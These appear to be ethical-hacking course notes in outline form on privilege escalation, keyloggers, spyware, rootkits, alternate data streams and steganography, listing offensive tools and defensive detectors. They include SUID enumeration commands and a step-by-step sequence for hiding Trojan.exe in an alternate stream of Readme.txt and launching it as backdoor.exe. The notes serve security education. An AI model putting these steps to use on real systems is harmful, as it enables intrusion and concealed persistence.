	- Privilege Escalation by Abusing Active Directory Certificate Services (ADCS):
		- Active Directory Certificate Services (ADCS) is commonly deployed across the AD environment to manage certificates for applications, users, systems, and other entities within the network.
		- Misconfigured ADCS templates can create critical vulnerabilities that attackers can exploit for malicious activities, such as stealing credentials, escalating privileges, and establishing persistence.
		- Attackers can use tools like Certipy to identify and exploit misconfigured ADCS templates.
		- Certipy : Certipy is an offensive tool used for enumerating and exploiting Active Directory Certificate Services (ADCS).
	- Other Privilege Escalation Techniques:
		- Access Token Manipulation:
			- In Windows operating systems, access tokens determine the security context of a process or thread, including the user's identity and privileges. After a user is authenticated, the system generates an access token, which is used by every process the user executes. The system verifies the access token when a process accesses a secured object.
			- Any Windows user can modify these access tokens, making the process appear to belong to a different user than the one who started it, thus adopting the new token's security context. For example, administrators typically log in as normal users and use the "runas" command to execute tools with elevated privileges. Attackers can exploit this to access other users' tokens or generate spoofed tokens, escalating privileges and performing malicious actions while evading detection.
		- Parent PID Spoofing:
			- Attackers attempt to bypass internal security mechanisms and escalate privileges by spoofing the parent process ID (PPID) of a newly created process. New processes typically inherit their PPID from their parent unless explicitly specified. This can be done by providing a PPID for the new process via the CreateProcess API. The API call includes specific arguments that determine which PPID to use.
			- The PPID can be set to that of system processes like svchost.exe or consent.exe, which are associated with Windows User Account Control (UAC). Attackers exploit these methods to bypass security restrictions on process spawning, evade tools that analyze parent-child relationships, and maintain persistence for privilege escalation.
		- Application Shimming:
			- Windows operating systems use the Windows Application Compatibility Framework, which includes "shims," to ensure compatibility between older and newer versions. For example, shimming allows programs designed for Windows XP to run on Windows 11. Shims act as a buffer between the program and the OS, checking if the program requires access to the shim database and using API hooking to redirect code for compatibility.
			- Shims installed by the default Windows installer (sbinst.exe) are stored at %WINDIR%\AppPatch\sysmain.sdb and in the registry at HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB. Running in user mode, shims can't modify the kernel but can be exploited to bypass UAC, inject malicious DLLs, capture memory addresses, etc. Attackers use these to disable Windows Defender, escalate privileges, install backdoors, and perform other malicious activities.
		- Filesystem Permission Weakness:
			- Many processes in Windows operating systems automatically execute binaries as part of their functionality or to perform specific actions. If the filesystem permissions for these binaries are misconfigured, an attacker can replace the legitimate binary with a malicious one, and the process will execute it.
			- If the process running the binary has elevated permissions, the malicious binary will also execute with those higher privileges, potentially including SYSTEM privileges. Attackers exploit this vulnerability to replace legitimate binaries with malicious ones, enabling privilege escalation. This technique is often used to manipulate Windows service binaries and self-extracting installers.
		- Path Interception:
			- Path interception is a technique where an attacker places a malicious executable in a specific path, causing the application to execute it instead of the legitimate target. Attackers can exploit various flaws or misconfigurations to perform path interception, such as unquoted paths (e.g., service paths and shortcut paths), misconfigured path environment variables, and search order hijacking.
		- Abusing Accessibility Features:
			- Attackers can establish persistence and escalate privileges by embedding and executing malicious code within Windows accessibility features. These features can be activated using key combinations even before a user logs into the system, allowing attackers to manipulate them and gain backdoor access without needing to log in.
			- In a Windows environment, these programs are typically stored in C:\Windows\System32\ and can be triggered by pressing specific keys during system reboot. Attackers can escalate privileges by replacing one of the accessibility features with cmd.exe or by modifying registry entries to launch malicious binaries when the key combination is pressed at the login screen. This technique enables attackers to gain system-level access.
			- Accessibility features abused by attackers:
				- On-screen keyboard: C:\Windows\System32\osk.exe
				- Magnifier: C:\Windows\System32\Magnify.exe
				- Narrator: C:\Windows\System32\Narrator.exe
				- Display switcher: C:\Windows\System32\DisplaySwitch.exe
				- App switcher: C:\Windows\System32\AtBroker.exe
				- Sticky keys: C:\Windows\System32\sethc.exe
		- SID-History Injection:
			- In Windows, a Security Identifier (SID) is a unique value assigned to each user and group account by the domain controller (DC) at the time of creation. Active Directory (AD) accounts can store multiple SID values in the SID-history attribute, which is used when migrating a user from one domain to another.
			- Attackers exploit this feature by injecting the SID of an administrator or equivalent account with higher privileges into the compromised user account's SID-history attribute. This injection can elevate the user's privileges, allowing the attacker to access restricted resources or remote systems. Attackers can also move laterally within the domain by using further techniques, such as accessing remote services, SMB/Windows admin shares, or Windows Remote Management.
		- COM Hijacking:
			- The Component Object Model (COM) is an interface framework in Windows environments that allows one software component to interact with another without being aware of its actual implementation. Attackers exploit COM objects by hijacking valid references and replacing them with their own, allowing them to infect the target system and achieve persistence.
			- This process involves modifying or replacing object references with malicious content in the Windows Registry. When a user executes the commonly used object, the malicious code is automatically triggered, enabling the attacker to maintain persistence and potentially escalate privileges associated with the object.
			- COM hijacking techniques:
				- Exploiting the registry loading process by creating a malicious user object under the HKEY_CURRENT_USER\Software\Classes\CLSID\ registry key, which is loaded by the system before the HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\ registry key.
				- Interchanging legitimate DLLs or executable names with malicious payloads, causing the payloads to execute when the legitimate DLLs or executables are run.
				- Exploiting orphaned requests made by system components that are not yet defined in the registry, creating malicious COM objects for those requests in the HKEY_CURRENT_USER registry and mapping them to malicious payloads hidden in the file system.
		- Scheduled Tasks in Windows:
			- Scheduled tasks allow users to automate routine tasks on a computer. Windows includes utilities such as at and schtasks. A user with administrator privileges can use these utilities, along with Task Scheduler, to schedule programs or scripts to run at specific dates and times. If the user provides proper authentication, they can also schedule tasks remotely using Remote Procedure Call (RPC).
			- Attackers can exploit this technique to execute malicious programs at system startup, maintain persistence, perform remote execution, escalate privileges, etc.
		- Scheduled Tasks in Linux:
			- Linux utilizes cron or crond, an instruction-based utility, for automating task scheduling. Attackers exploit this utility to trigger malicious payloads when a specific task is scheduled for execution. The scheduler allows users with administrator privileges to configure cron jobs and execute them at specified times. cron runs commands from the crontab file, typically located at /etc/crontab.
			- Attackers can escalate privileges by modifying scripts executed by cron in /etc/crontab. By altering these scripts, attackers can ensure malicious code is executed automatically during system reboot, potentially gaining root privileges.
		- Launch Daemon:
			- During the macOS boot process, launchd is executed to complete the system initialization. It loads parameters for each launch-on-demand system-level daemon found in /System/Library/LaunchDaemons and /Library/LaunchDaemons. These daemons have associated property list files (plists), which are linked to executables that run during boot.
			- Attackers can create and install a new launch daemon configured to execute at boot time by using launchd or launchctl to load plists into the appropriate directories. Weak configurations may allow attackers to alter the executable of an existing launch daemon, enabling them to maintain persistence or escalate privileges.
		- Plist Modification:
			- In macOS, plist (property list) files contain all the necessary information to configure applications and services. These files specify when programs should execute, the executable file path, program parameters, essential OS permissions, etc. Plist files are stored in specific locations, such as /Library/Preferences (which execute with elevated privileges) and ~/Library/Preferences (which execute with user-level privileges).
			- Attackers can access and modify these plist files to execute malicious code on behalf of a legitimate user, using them as a persistence mechanism and to escalate privileges.
		- Setuid and Setgid:
			- In Linux and macOS, when an application uses the setuid or setgid flags, the application executes with the privileges of the owning user or group, respectively. Normally, applications run under the current user’s privileges. However, there are situations where programs need to be executed with elevated privileges, even though the user running the program does not require them.
			- In such cases, the setuid or setgid flags can be set for the application. An attacker can exploit applications with the setuid or setgid flags to execute malicious code with elevated privileges.
		- Web Shell:
			- A web shell is a web-based script that provides access to a web server. Web shells can be created on various operating systems, including Windows, Linux, and macOS. Attackers use web shells to inject malicious scripts onto a web server, enabling them to maintain persistent access and escalate privileges. A web shell acts as a backdoor, allowing attackers to gain access and control over a remote server.
			- Typically, a web shell runs under the current user’s privileges. Using a web shell, an attacker can escalate privileges by exploiting local system vulnerabilities. Once privileges are escalated, the attacker can install malicious software, modify user permissions, add or remove users, steal credentials, read emails, etc.
		- Abusing Sudo Rights:
			- Sudo (substitute user do) is a UNIX and Linux-based system utility that allows users to run commands as a superuser or root, using the security privileges of another user. The /etc/sudoers file contains the configuration for sudo rights, detailing access permissions, including which commands can be run with or without a password, for each user or group.
			- Attackers can exploit sudo to escalate their privileges and run programs that normal users are not authorized to execute. For example, if an attacker has sudo rights to run the cp command, they could overwrite the /etc/sudoers or /etc/shadow files with their own malicious files. By modifying the content of the sudoers file, the attacker could alter permissions to run restricted commands or programs, enabling further attacks on the system.
		- Abusing SUID and SGID Permissions:
			- Set User Identification (SUID) and Set Group Identification (SGID) are access permissions assigned to program files in UNIX-based systems. These permissions allow users to execute a program with temporarily elevated or root privileges in order to perform a specific task. Files with SUID and SGID rights run with higher privileges than those of the user running the program.
			- In Linux, certain commands and binaries can be exploited by attackers to escalate their privileges from non-root users to root, if the SUID and SGID flags are set. Some of the executable commands that attackers can use to spawn a shell and escalate privileges include nmap, vim, less, more, bash, cat, cp, echo, find, nano, and others.
			- Find SUID and SGID files in the target system:
				- Find SUID: find / -perm -u=s -type f 2>/dev/null
				- Find GUID: find / -perm -g=s -type f 2>/dev/null
		- Kernel Exploits:
			- Kernel exploits refer to programs that take advantage of vulnerabilities in the kernel to execute arbitrary commands or code with elevated privileges. By successfully exploiting these kernel vulnerabilities, attackers can gain superuser or root-level access to the target system. To execute a kernel exploit, attackers typically need specific configuration details of the target system.
			- OS, kernel version, and architecture of the target system:
				- OS: cat /etc/issue
				- Kernel version: uname -a
				- Architecture: cat /proc/version
			- Detect kernel exploits for escalating privileges: www.exploit-db.com -> linprivchecker.py
		- Abusing '.' in the Path:
			- Adding . to the PATH allows users to execute binaries or scripts from the current directory. While convenient, this practice poses a security risk. If an attacker gains access to a system where a privileged user runs scripts from various directories, they can manipulate the PATH to include a malicious directory.
			- For example, by placing a malicious script named ls in the attacker-controlled directory, the system will execute it instead of the legitimate ls command. This enables the attacker to run arbitrary commands, potentially escalating privileges if the user has elevated permissions.
		- Abusing Elevation Control Mechanism on macOS:
			- Attackers may exploit the AuthorizationExecuteWithPrivileges API for privilege escalation. This API is designed to allow developers to perform operations requiring root privileges, such as software installation or updates. However, it lacks proper validation to verify whether root access requests come from a trusted source.
			- Attackers can exploit this vulnerability to gain root privileges, enabling them to install malicious software and establish persistence on victim systems. When this API is invoked, the user is prompted for their credentials without any verification of the program’s source or integrity. Additionally, the program using the API may load world-writable files, which can be modified by attackers to execute malicious actions with elevated privileges.
		- Process Injection via Ptrace System Calls:
			- Attackers may exploit the ptrace (process trace) system call to inject malicious code into running processes, allowing them to evade process-based defenses and potentially escalate privileges. The ptrace system call enables attackers to debug a process, monitoring and manipulating its memory and register values.
			- Typically, ptrace injection involves writing arbitrary code into a running process (e.g., using malloc) and then using PTRACE_SETREGS to set the register that contains the next instruction to execute. Alternatively, attackers can use PTRACE_POKETEXT or PTRACE_POKEDATA to copy data into specific addresses in the target process's memory, such as the address of the next instruction to execute.
		- Abusing Microsoft Software Installer (MSI):
			- In Windows, MSI files act as databases that contain the dependencies and instructions necessary for installing and removing software. They also allow developers to execute additional scripts during installation, removal, or repair through Custom Actions. During software installation, MSI files are stored in the C:\Windows\Installer directory with randomized names and a .msi extension.
			- This setup enables regular users to use the "repair" functionality to fix issues like missing files, broken shortcuts, invalid registry entries, and other malfunctions. When invoked, the "repair" process can trigger critical actions, including file creation and execution, under the NT AUTHORITY\SYSTEM account, even when initiated by a standard user.
			- If not properly managed, this can pose significant risks. Poorly configured Custom Actions running as NT AUTHORITY\SYSTEM can be exploited by attackers to elevate privileges. Misconfigurations may allow file operations in directories writable by standard users, enabling attackers to modify files used by NT AUTHORITY\SYSTEM and execute arbitrary code, ultimately escalating their privileges.
		- Abusing Windows Filtering Platform (WFP) - NoFilter Attack:
			- The NoFilter attack is a privilege escalation technique that exploits the Windows Filtering Platform (WFP) on Windows 11 systems to gain system-level privileges. This method allows attackers to infiltrate deep into the operating system, run malicious child processes, execute malware with NT AUTHORITY\SYSTEM privileges, or even impersonate other logged-in users to maintain persistence without detection.
			- In this attack, the attacker first identifies the BfeRpcOpenToken method in the WFP by invoking WinAPI through RPC mapping using tools like RPC Mapper. The attacker then exploits the WFP to retrieve a handle to the access token of another process with system-level privileges from the NT handle table. After obtaining the handle to the targeted access token, the attacker uses it to create a copy of the token.
			- Methods for duplicating the acquired access token without triggering detection:
				- Token duplication via WfpAle component : This involves calling the WfpAleProcessTokenReference method in Windows, which causes the TCP/IP driver to duplicate the token and store it in the hash table. The LUID returned by the driver can be used to retrieve the duplicated access token.
				- Token duplication via IPsec connection : This method involves manipulating a user service to create an IPsec connection with the TCP/IP driver, which then duplicates the token and stores it in the hash table. Since the LUID of the token is not returned in this process, the token can only be retrieved by brute-forcing the LUID, which ranges from 1 to 4096.
			- Once the token is duplicated, the attacker can escalate privileges and perform high-level operations on the system, including duplicating tokens from services like LSM, Schedule, and Winmgmt.
- Privilege Escalation Tools
	- BeRoot : Post-exploitation tool designed to identify common misconfigurations that could lead to privilege escalation, focusing solely on potential escalation paths without performing any exploitation or comprehensive system assessment.
	- pwncat : Pwncat is a command and control framework that enhances a basic reverse or bind shell by providing raw terminal access, automated enumeration, file transfer, persistence installation, and privilege escalation capabilities, turning it into a fully-featured exploitation platform.
	- linpostexp : Linux post exploitation enumeration and exploit checking tools (github.com/reider-roque/linpostexp)
	- traitor : Automated Linux privilege escalation tool that exploits common misconfigurations and vulnerabilities, such as gtfobins, pwnkit, dirty pipe, and vulnerable +w docker.sock permissions, to quickly escalate privileges and gain a root shell.
	- PEASS-ng : Privilege Escalation Awesome Scripts - Next Generation is a collection of post-exploitation tools designed to aid in privilege escalation on Windows and Linux systems. It automates the discovery of potential privilege escalation vectors by scanning for misconfigurations, vulnerable services, weak permissions, and known exploits, providing detailed information and scripts to escalate privileges.
	- Windows Exploit Suggester : This tool compares a target's patch levels against the Microsoft vulnerability database to detect potential missing patches. It also notifies the user if public exploits or Metasploit modules are available for the missing bulletins.
	- PowerSploit : PowerShell Post-Exploitation Framework that is a collection of Microsoft PowerShell modules that aid penetration testers during all phases of an assessment
	- FullPowers : Proof-of-Concept tool I made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
- Tools for Defending against DLL and Dylib Hijacking
	- Dependency Walker : Scans Windows modules, builds a dependency tree, lists exported functions, and helps troubleshoot issues like missing modules, import/export mismatches, and initialization failures.
	- Dylib Hijack Scanner : Dylib Hijack Scanner (DHS) is a utility that scans the computer for applications that are either susceptible to dylib hijacking or have been hijacked.
	- DLL Hijack Audit Kit : A toolkit that detects applications vulnerable to DLL hijacking (released in 2010).
	- DLLSpy : A tool that detects DLL hijacking in running processes, services, and their binaries.
	- InSpectre : Examine and understand the hardware and software capabilities of any Windows system to prevent Meltdown and Spectre attacks.
	- Spectre & Meltdown Checker : A shell script to assess a system's resilience against the various transient execution CVEs published since early 2018 and provide guidance on how to mitigate them.


## Maintaining Access
Use Different Techniques to Conceal Malicious Programs and Maintain Remote Access to the System.

- Executing Applications
	- When attackers execute malicious applications remotely on a victim’s machine, it is referred to as "owning" the system, enabling them to gather information for exploitation or privacy breaches, gain unauthorized access to system resources, exfiltrate data, capture screenshots, and install backdoors for sustained access.
	- Malicious Programs Executed by Attackers on Target Systems:
		- Backdoors
		- Crackers
		- Keyloggers
		- Spyware
	- Remote Code Execution Techniques:
		- Exploitation for Client Execution:
			- Web-Browser-Based Exploitation
			- Office-Applications-Based Exploitation (MS Office, Email Applications)
			- Third-Party Applications-Based Exploitation (Adobe Reader, Flash, etc.)
		- Service Execution
			- System services are backend programs in an OS. Attackers exploit them by running binaries or commands that interact with tools like the Service Control Manager, creating or modifying services to escalate privileges or maintain access.
		- Windows Management Instrumentation (WMI)
			- WMI, a Windows feature, manages system resources locally and remotely. Attackers exploit it to access systems, gather data, and execute code to maintain access.
		- Windows Remote Management (WinRM)
			- WinRM is a Windows protocol that enables users to run executable files and modify system services or the registry on remote systems. Attackers exploit WinRM to execute payloads and facilitate lateral movement.
	- Tools for Executing Applications:
		- Dameware Remote Support - Solarwinds
		- Ninja : A privilege escalation detection and prevention system for GNU/Linux hosts
		- Pupy : Open-source, cross-platform remote administration tool (RAT) and post-exploitation framework that executes in memory, leaves a low footprint, and supports multiple communication transports and process migration
		- PsExec : PsExec is a lightweight telnet-replacement utility that allows an attacker to execute processes on remote systems with full interactivity, without needing to install client software on the remote machines.
	- Keyloggers
		- Types of Keystroke Loggers:
			- Hardware Keylogger
				- PC/BIOS Keylogger
				- Keylogger Keyboard
				- External Keylogger
					- PS/2 and USB Keylogger
					- Acoustic/CAM Keylogger
					- Bluetooth Keylogger
					- Wi-Fi Keylogger
			- Software Keylogger
				- Application Keylogger
				- Kernel/Rootkit/Device Driver Keylogger
				- Hypervisor-based Keylogger
				- Form Grabbing Based Keylogger
				- JavaScript Based Keylogger
				- Memory Injection Based Keylogger
		- Keyloggers:
			- KeyGrabber (www.keydemon.com) - HW
			- KeyGrabber USB (www.keelog.com) - HW
			- KeyCarbon (www.keykatcher.com) - HW
			- Keyboard logger (www.detective-store.com) - HW
			- KeyGhost (www.keyghost.com) - HW
			- KEYKatcher (keykatcher.com) - HW
			- Spyrix Personal Monitor (www.spyrix.com) - SW Windows
			- REFOG Personal Monitor (www.refog.com) - SW Windows
			- All In One Keylogger (www.relytec.com) - SW Windows
			- Revealer Keylogger Pro (www.logixoft.com) - SW Windows
			- NetBull (www.netbull.com) - SW Windows
			- Spytector (www.spytector.com) - SW Windows
			- Hoverwatch (www.refog.com) - SW Mac
			- Spyrix Keylogger for Mac (www.spyrix.com) - SW Mac
			- CleverControl (clevercontrol.com) - SW Mac
			- FlexiSPY (www.flexispy.com) - SW Mac
			- KidLogger (kidlogger.net) - SW Mac
			- Perfect Keylogger for Mac (www.blazingtools.com) - SW Mac
	- Spywares
		- Types of Spyware:
			- Desktop Spyware
			- Email Spyware
			- Internet Spyware
			- Child-Monitoring Spyware
			- Screen-Capturing Spyware
			- USB Spyware
			- Audio Spyware
			- Video Spyware
			- Print Spyware
			- Telephone/Cellphone Spyware
			- GPS Spyware
		- Spyware Tools:
			- Spytech SpyAgent (www.spytech-web.com)
			- Spyrix Personal Monitor (www.spyrix.com)
			- CurrentWare (www.currentware.com)
			- FlexiSPY (www.flexispy.com)
			- NetVizor (www.netvizor.net)
			- SoftActivity Monitor (www.softactivity.com)
			- SoftActivity TS Monitor (www.softactivity.com)
			- USB Monitor (www.hhdsoftware.com)
			- USBDeview (www.nirsoft.net)
			- Advanced USB Port Monitor (www.aggsoft.com)
			- Free USB Analyzer (freeusbanalyzer.com)
			- TheOneSpy (www.theonespy.com)
			- Snooper (www.snooper.se)
			- iSpy (www.ispyconnect.com)
			- Perfect IP Camera Viewer (www.perfect-surveillance.com)
			- Optiview VMS (optiviewusa.com)
			- Eyeline Video Surveillance Software (www.nchsoftware.com)
			- mSpy (www.mspy.com)
			- XNSPY (xnspy.com)
			- iKeyMonitor (ikeymonitor.com)
			- ONESPY (onespy.in)
			- Highster Mobile (www.highstermobiles.com)
			- SPYERA (spyera.com)
			- Snoopza (snoopza.com)
			- MobiStealth (www.mobistealth.com)
			- FlexiSPY (www.flexispy.com)
			- Mobile Tracker Free (mobile-tracker-free.com)
	- Anti-Keyloggers (Anti-Keystroke Loggers)
		- Zemana AntiLogger (zemana.com)
		- GuardedID (www.guardedid.com) 
		- KeyScrambler (www.qfxsoftware.com) 
		- Oxynger KeyShield (www.oxynger.com) 
		- Ghostpress (schiffer.tech) 
		- SpyShelter (www.spyshelter.com)
	- Anti-Spyware
		- SUPERAntiSpyware (www.superantispyware.com)
		- Kaspersky Total Security 20 (support.kaspersky.com) 
		- SecureAnywhere Internet Security Complete (www.webroot.com) 
		- Avast One (www.avast.com) 
		- MacScan 3 (www.securemac.com) 
		- Malwarebytes (www.malwarebytes.com)
- Hiding Files
	- Rootkits
		- A rootkit is a stealthy malware program that enables attackers to gain and maintain unauthorized root-level access to a system while hiding their presence and malicious activities by modifying operating system components and utilities.
		- System hooking is the process of modifying and replacing the original function pointer with one provided by the rootkit in stealth mode. Inline function hooking is a technique in which a rootkit modifies some of the bytes of a function within core system DLLs (such as kernel32.dll and ntdll.dll), inserting an instruction so that any process calls are directed to the rootkit first.
		- Types of Rootkits:
			- Hypervisor-Level Rootkit : Hypervisor-level rootkits exploit hardware features like Intel VT and AMD-V to run in Ring-1, hosting the target OS as a virtual machine and intercepting all its hardware calls by altering the boot sequence to load themselves instead of the original virtual machine monitor.
			- Hardware/Firmware Rootkit : Hardware or firmware rootkits embed persistent malware in hardware components like the BIOS, hard drive, or network card, evading detection by hiding in firmware, which is rarely inspected for code integrity.
			- Kernel-Level Rootkit : A kernel-level rootkit operates in Ring-0 with the highest OS privileges, modifying kernel code or adding malicious code via device drivers (Windows) or loadable kernel modules (Linux). These rootkits are hard to detect, can destabilize the system if buggy, and can intercept or manipulate OS operations.
			- Boot-Loader-Level Rootkit : Boot-loader-level rootkits, or bootkits, operate by modifying or replacing the legitimate boot loader, allowing them to activate before the OS starts.
			- Application-Level/User-Mode Rootkit : An application-level/user-mode rootkit runs in Ring-3 alongside other applications, exploiting API behavior to replace standard application files (application binaries) or modify existing applications with patches or injected malicious code.
			- Library-Level Rootkits : Library-level rootkits operate high in the OS, patching, hooking, or replacing system calls with backdoor versions to conceal the attacker’s presence by hiding information.
			- Memory Rootkits : Memory rootkits, or volatile rootkits, are malware that reside solely in a system's RAM, leaving no traces on disk. Unlike traditional rootkits, they operate entirely in volatile memory, making them more elusive and harder to detect.
		- Rootkit Softwares:
			- FudModule Rootkit : The FudModule Rootkit exploits a zero-day admin-to-kernel vulnerability in the Windows AppLocker driver (appid.sys) and employs DKOM techniques to bypass various kernel security mechanisms, thereby gaining kernel-level access. (decoded.avast.io)
			- Fire Chili Rootkit : The Fire Chili rootkit is a sophisticated malware that exploits the Log4Shell vulnerability to enable espionage and data exfiltration. Operating at the kernel level, it allows attackers to intercept, modify, or hide system calls, processes, and network connections, providing long-term remote control and data theft capabilities. (www.fortinet.com)
			- CopperStealer : CopperStealer is a type of malware designed to steal sensitive information from infected systems, primarily focusing on credentials such as login details, cookies, and saved passwords from web browsers. The CopperStealer rootkit is a variant of the CopperStealer malware that incorporates rootkit functionalities. It not only steals sensitive information like login credentials, cookies, and cryptocurrency wallet data but also uses rootkit techniques to hide its presence on the infected system.
			- Syslogk : The Syslogk rootkit is a sophisticated piece of malware targeting Linux systems, designed to operate covertly and evade detection. It installs itself as a kernel module, allowing it to intercept and manipulate system logs, effectively concealing its presence and activities. Syslogk enhances its stealth by removing its own entry from the list of installed kernel modules, making it challenging for system administrators to detect.
			- Adore-Ng Rootkit : The Adore-Ng rootkit is a Linux-based rootkit originally developed as an open-source tool to conceal the presence of malicious software and activities on a compromised system. It is an enhanced version of the Adore rootkit. Operating at the kernel level, Adore-Ng allows attackers to intercept and modify critical system operations, making it difficult for security tools and system administrators to detect.
			- Stealthy Universal Rootkit : The Stealthy Universal Rootkit (SUR) is a covert and versatile rootkit targeting multiple operating systems, including Windows, Linux, and macOS. Operating at the kernel level, it manipulates system processes and files while evading detection using advanced techniques. SUR ensures persistent access, allowing attackers to remotely control the system, exfiltrate data, and install additional malware, all while remaining hidden from security tools.
			- Reptile Rootkit : The Reptile rootkit is a Linux-based rootkit that operates at the kernel level, allowing attackers to gain persistent control over a system while remaining hidden. It uses advanced stealth techniques to conceal files, processes, and network connections, making it difficult to detect and remove, while providing remote access to compromised systems.
			- CosmicStrand : The CosmicStrand rootkit is a UEFI-based rootkit that infects a computer's firmware, giving attackers deep, persistent control over the system. It operates below the OS level, evading detection by security software and surviving OS reinstallation. This rootkit allows remote control, data theft, and the installation of additional malware, making it a significant security threat.
		- Rootkit Detection Techniques :
			- Integrity-Based Detection : Integrity-based detection serves as an alternative to both signature and heuristic-based detection. Tools like Tripwire and AIDE are initially run on a clean system to create a baseline of system files, which are stored in a database. The detection process compares the current filesystem, boot records, or memory snapshot with the trusted baseline, identifying malicious activity by detecting differences between the two.
			- Signature-Based Detection : Signature-based detection identifies rootkits by comparing system processes and files to a database of known rootkit fingerprints. It scans system files and kernel memory to detect malicious programs, including hidden rootkits. However, its effectiveness is limited, as rootkits often hide files or interrupt detection software’s execution path.
			- Heuristic/Behavior-Based Detection : Heuristic-based detection identifies rootkits by recognizing deviations in normal system behavior, also known as behavioral detection. It can detect new, unknown rootkits by spotting irregularities, such as execution path hooking, that differ from standard system patterns.
			- Runtime Execution Path Profiling : Runtime execution path profiling compares the execution paths of system processes and files. Rootkits destabilize routines by adding new code to the execution path. This method hooks instructions before and after routines, as they may differ significantly.
			- Cross-View-Based Detection : Cross-view-based detection assumes the OS has been subverted and enumerates system files, processes, and registry keys using common APIs. It compares this data with a dataset gathered through an algorithm that avoids manipulation. This method relies on the fact that API hooking or kernel manipulation taints the data returned by the OS, allowing for detection of tampered information.
			- Alternative Trusted Medium : The alternative trusted medium technique is a reliable method for detecting rootkits. It involves shutting down the infected system, booting from trusted media like a USB drive, and scanning the OS storage for rootkit traces, which can then be removed to restore the system.
			- Analyzing Memory Dumps : Memory dump analysis involves dumping and analyzing the system's volatile memory (RAM) to detect rootkits. It captures a snapshot of the entire system, process, or kernel, enabling offline forensic analysis. Specialized hardware may be needed to create the memory dump.
			- Virtualization-Based Analysis : Virtualization-based analysis uses introspection techniques to monitor guest operating systems for virtual rootkit activity. Security solutions run within the hypervisor to detect and mitigate virtual rootkits.
		- Anti-Rootkits:
			- GMER (www.gmer.net)
			- Stinger (www.trellix.com)
			- Avast One (www.avast.com)
			- TDSSKiller (usa.kaspersky.com)
			- Malwarebytes Anti-Rootkit (www.malwarebytes.com)
			- AVG Rootkit Scanner (www.avg.com)
	- NTFS Data Stream
		- The NTFS filesystem stores files using two primary data streams: the first holds the security descriptor, such as file permissions, and the second contains the actual file data. Alternate Data Streams (ADS), a feature of NTFS, attach additional data to a file without altering its size, functionality, or visibility in file-browsing utilities. ADS stores metadata such as file attributes, timestamps, and word count and can also be used to embed additional data or malicious code. By forking data into existing files, ADS remains undetected in standard file inspection and provides attackers with a method to hide malicious code, rootkits, or hacker tools. This enables the execution of malicious content without detection by users or system administrators.
		- NTFS data streams allow attackers to hide files undetectable by standard file explorers or security software, as explorers only display root files and ignore linked streams. If a virus embeds itself in an ADS, it remains hidden, as users and default operations interact only with the main data stream.
		- Create NTFS Streams:
			- Open Notepad: notepad myfile.txt:lion.txt
			- Click ‘Yes’ to create the new file, enter some data, and save it
			- View the file size of myfile.txt—it should show as zero
			- The same command can be used to view or modify hidden stream data
		- NTFS Stream Manipulation:
			- Hiding Trojan.exe (Malicious Program) in Readme.txt (Stream):
				- Move the contents of Trojan.exe into an alternate data stream of Readme.txt:
					- c:\> type c:\Trojan.exe > c:\Readme.txt:Trojan.exe
					- The type command hides a file in an alternate data stream (ADS) associated with an existing file. The colon (:) operator is used to specify and create or access the ADS.
			- Creating a Link to the Trojan.exe Stream in the Readme.txt File:
				- After hiding the Trojan.exe file within the Readme.txt file's stream, create a symbolic link to launch Trojan.exe directly from the stream. This provides a shortcut to access the hidden stream.
					- C:\> mklink backdoor.exe Readme.txt:Trojan.exe
			- Executing the Trojan:
				- C:\>backdoor.exe
		- NTFS Streams Detector:
			- Tripwire File Integrity Manager - file integrity checker
			- EventSentry SysAdmin Tools - manipulate hidden streams
			- adslist.exe - manipulate hidden streams
			- Sysinternals’ Streams Utility - identifying and analyzing ADS within system
			- Stream Armor (securityxploded.com)
			- LADS (www.aldeid.com)
			- Stream Detector (www.novirusthanks.org)
			- GMER (www.gmer.net)
			- ADS Scanner (www.pointstone.com)
			- Streams (learn.microsoft.com)
			- AlternateStreamView (www.nirsoft.net)
	- Steganography
		- Steganography is a technique for hiding a secret message within an ordinary message, such as embedding data in a graphic image, to maintain data confidentiality. It is commonly used by attackers to conceal sensitive information, including lists of compromised servers, source code for hacking tools, or plans for future attacks.
		- Steganography hides the existence of a message by replacing bits of unused data in ordinary files, such as graphics, sound, text, audio, or video, with hidden information. The concealed data can take the form of plaintext, ciphertext, or even another image.
		- Classification of Steganography:
			- Technical : Technical steganography employs physical or chemical methods, such as invisible ink, microdots, and computer-based techniques, to conceal the existence of a message. Examples include invisible ink, microdots, and computer-based methods.
				- Computer-based Steganography Techniques:
					- Substitution Techniques : In this technique, the attacker encodes secret information by replacing insignificant bits with the hidden message. If the receiver knows the locations where the secret information is embedded, they can extract the hidden message.
					- Transform Domain Techniques : The transform domain technique hides information in significant parts of the cover image, such as during cropping, compression, or other image processing operations, making it more resistant to attacks. Transformations can be applied either to specific blocks of the image or to the entire image.
					- Spread Spectrum Techniques : This technique is less susceptible to interception and jamming. It involves communication signals occupying more bandwidth than necessary to transmit the information. The sender increases the bandwidth using a code independent of the data, while the receiver employs synchronized reception with the same code to extract the information from the spread spectrum signal.
					- Statistical Techniques : This technique leverages “1-bit” steganography schemes by modifying the cover so that transmitting a “1” significantly alters certain statistical characteristics. When no transmission occurs, the cover remains unchanged, allowing differentiation between modified and unmodified covers. The extraction process relies on hypothesis testing from mathematical statistics.
					- Distortion Techniques : In this technique, the user applies a series of modifications to the cover to create a stego-object, with the modifications representing the transformation of a specific message. Decoding requires knowledge of the original cover, allowing the receiver to measure the differences between the original and the received cover to reconstruct the sequence of modifications.
					- Cover Generation Techniques : In this technique, digital objects are specifically designed to serve as covers for secret communication. The information is encoded in a way that ensures the creation of a suitable cover for concealing the secret message.
			- Linguistic : This type of steganography conceals a message within the carrier of another file, often utilizing text-based or language-driven methods.
				- Semagram : Semagrams are a steganography technique that conceals information using signs or symbols. In this method, the user embeds objects or symbols within the data, altering its appearance to convey a predetermined meaning.
					- Visual Semagram : This technique conceals information within drawings, paintings, letters, music notes, or symbols.
					- Text Semagram : A text semagram hides a message by altering the appearance of the carrier text, such as changing font sizes and styles, adding extra spaces or white spaces, and incorporating flourishes in letters or handwritten text.
				- Open Codes : Open code conceals a secret message within a legitimate carrier message, designed in a pattern that is unclear to the average reader. The carrier message, also known as overt communication, hides the secret message, referred to as covert communication.
					- Covered Ciphers : This technique conceals the message within a carrier medium that is visible to everyone. The hidden message can be extracted by anyone who knows the method used to embed it.
